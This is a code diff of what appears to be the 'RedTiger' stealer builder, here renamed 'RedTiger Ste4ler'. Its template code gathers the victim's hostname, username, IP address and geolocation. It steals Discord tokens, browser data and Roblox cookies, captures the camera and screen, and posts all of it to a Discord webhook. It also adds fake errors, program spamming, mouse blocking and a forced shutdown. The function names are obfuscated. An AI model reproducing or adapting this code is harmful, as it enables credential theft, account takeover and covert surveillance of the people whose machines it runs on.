@@ -111,9 +111,6 @@ def F4k3_3rr0r(): pass
 def Sp4m_0p3n_Pr0gr4m(): pass
 def Shutd0wn(): pass
     
-def current_time_day_hour():
-    return datetime.datetime.now().strftime('%Y/%m/%d - %H:%M:%S')
-
 def Clear():
     try:
         if sys.platform.startswith("win"):
@@ -123,16 +120,15 @@ def Clear():
     except:
         pass
 
-Clear()
 
 color_embed = 0xB20000
-username_embed = 'RedTiger'
+username_embed = 'RedTiger Ste4ler'
 avatar_embed = 'https://media.discordapp.net/attachments/1185940734256357427/1252261629546987550/logo_redtiger.png?ex=66719306&is=66704186&hm=c0cdee4699eb76dd404125866c4130d77ed177426daf71d8c976e5bbcb44c6bd&=&format=webp&quality=lossless&width=810&height=810'
 footer_embed = {
-        "text": f"Red Tiger | {current_time_day_hour()}",
+        "text": f"RedTiger Ste4ler",
         "icon_url": avatar_embed,
         }
-footer_text = f"RedTiger | {current_time_day_hour()}"
+footer_text = f"RedTiger Ste4ler"
                  
 
 try: hostname_pc = socket.gethostname()
@@ -141,13 +137,11 @@ except: hostname_pc = "None"
 try: username_pc = os.getlogin()
 except: username_pc = "None"
 
-
 try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
 except: displayname_pc = "None"
 
 try: ip_address_public = requests.get('https://httpbin.org/ip').json()['origin']
 except: ip_address_public = "None"
-
 
 try:
     socket.socket(socket.AF_INET, socket.SOCK_DGRAM).connect(('8.8.8.8', 80))  
@@ -165,28 +159,13 @@ try:
 except:
     ip_address_ipv6 = "None"
 
-
 try:
     try:
-        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
-        ipdata = loads(ipdatanojson)
-    except:
-        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_ipv6}")).read().decode().replace('callback(', '').replace('})', '}')
-        ipdata = loads(ipdatanojson)
-
-    try:
-        country_code = ipdata["country_code"].lower()
-    except:
-        country_code = "None"
-except:
-    country_code = "None"
-
-try:
-    try:
-        response = requests.get(f"https://redtiger/api/ip/ip={ip_address_public}")
+        response = requests.get(f"https://redtiger.shop/api/ip/ip={ip_address_public}")
         api = response.json()
 
         country = api['country']
+        country_code = api['country_code']
         region = api['region']
         region_code = api['region_code']
         zip_postal = api['zip']
@@ -202,6 +181,7 @@ try:
         api = response.json()
 
         country = api['country']
+        country_code = api['countryCode']
         region = api['regionName']
         region_code = api['region']
         zip_postal = api['zip']
@@ -213,7 +193,7 @@ try:
         org = api['org']
         as_number = api['as']
 except:
-    country, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
+    country, country_code, region, region_code, city, zip_postal, latitude, longitude, timezone, isp, org, as_number = "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None", "None"
 '''
 
 # ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
@@ -359,11 +339,7 @@ Main Screen  : "No"
             'title': title,
             "fields": fields,
             'color': color,
-            "footer": footer,
-            "thumbnail": {
-                "url": ""
-                }
-        
+            "footer": footer
         }
 
 
@@ -384,7 +360,7 @@ Main Screen  : "No"
 
         requests.post(webhook_url, data=json_data, headers=headers)
 
-    title = f':computer: | System Info `{username_pc} "{ip_address_public}"`:'
+    title = f'System Info `{username_pc} "{ip_address_public}"`:'
 
     fields = [
     {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name        : "{hostname_pc}"
@@ -416,7 +392,7 @@ As     : "{as_number}"```""", "inline": False},
 Secondary Screen:
 {s3c0nd_5cr33n}```""", "inline": False},
 
-{"name": f":flag_{country_code}: | Location:", "value": f"""```Country   : "{country} ({country_code})"
+{"name": f":map: | Location:", "value": f"""```Country   : "{country} ({country_code})"
 Region    : "{region} ({region_code})"
 Zip       : "{zip_postal}"
 City      : "{city}"
@@ -678,7 +654,7 @@ def Di5c0rd_T0k3n():
                 except:
                     g1ft_c0d35_d15c0rd = "None"
 
-                embed = Embed(title=f':speech_balloon: | Discord Info `{username_pc} "{ip_address_public}"`:', color=color_embed)
+                embed = Embed(title=f'Discord Token `{username_pc} "{ip_address_public}"`:', color=color_embed)
                 embed.set_thumbnail(url=av4t4r_ur1_d15c0rd)
                 embed.add_field(name=":bust_in_silhouette: | Username:",
                                 value=f"```{us3r_1d_d15c0rd}```", inline=True)
@@ -773,7 +749,7 @@ def Br0w53r_5t341():
         def send(self):
             self.w3bh00k.send(
                 embed=Embed(
-                    title=f":globe_with_meridians: | Browsers Info `{username_pc} \"{ip_address_public}\"`:",
+                    title=f"Browser Steal `{username_pc} \"{ip_address_public}\"`:",
                     description="```" +
                     '\n'.join(self.tree(Path(f"Browsers_{username_pc}"))) + "```",
                     color=color_embed,
@@ -1156,7 +1132,7 @@ def R0b10x_C00ki3():
             client = SyncWebhook.from_url(w3bh00k_ur1)
 
             embed = discord.Embed(
-                title=f':video_game: | Roblox Info `{username_pc} "{ip_address_public}"`:',
+                title=f'Roblox Cookie `{username_pc} "{ip_address_public}"`:',
                 color=color_embed
             )
             embed.set_footer(text=footer_text, icon_url=avatar_embed)
@@ -1214,7 +1190,7 @@ def C4m3r4_C4ptur3():
             path_file_capture = name_file_capture
             c4ptur3(path_file_capture)
 
-        embed = Embed(title=f":camera: | Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
+        embed = Embed(title=f"Camera Capture `{username_pc} \"{ip_address_public}\"`:", color=color_embed, description=f"```└── 📷 - {name_file_capture}```")
         embed.set_footer(text=footer_text, icon_url=avatar_embed)
 
         w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
@@ -1272,7 +1248,7 @@ def Scr33n5h0t():
             path_file_screen = name_file_screen
             capture(path_file_screen)
 
-        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
+        embed = Embed(title=f"Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)
         embed.set_image(url=f"attachment://{name_file_screen}")
         embed.set_footer(text=footer_text, icon_url=avatar_embed )
         w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
@@ -1433,14 +1409,13 @@ payload = {
 }
 requests.post(w3bh00k_ur1, json=payload)
 
-try:
-    F4k3_3rr0r()
-except:
-    pass
-try:
-    Sp4m_0p3n_Pr0gr4m()
-except:
-    pass
+try: F4k3_3rr0r()
+except: pass
+try: Sp4m_0p3n_Pr0gr4m()
+except: pass
+try: B10ck_M0u53()
+except: pass
+
 Clear()
 '''
 
@@ -1505,7 +1480,6 @@ def F4k3_3rr0r():
 
 Shutd0wn = r'''
 def Shutd0wn():
-    "Perm Admin Required"
     if sys.platform.startswith('win'):
         os.system('shutdown /s /t 15')
     elif sys.platform.startswith('linux'):
@@ -1613,14 +1587,14 @@ def B10ck_M0u53():
     width, height = pyautogui.size()
     pyautogui.moveTo(width + 100, height + 100)
 
-while True:
-    try:
-        B10ck_M0u53()
-        if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
-            Unb10ck_K3y()
-            break
-    except:
-        pass
+    while True:
+        try:
+            B10ck_M0u53()
+            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
+                Unb10ck_K3y()
+                break
+        except:
+            pass
 '''
 
 #    ╔════════════════════════════════════════════════════════════════════════════╗
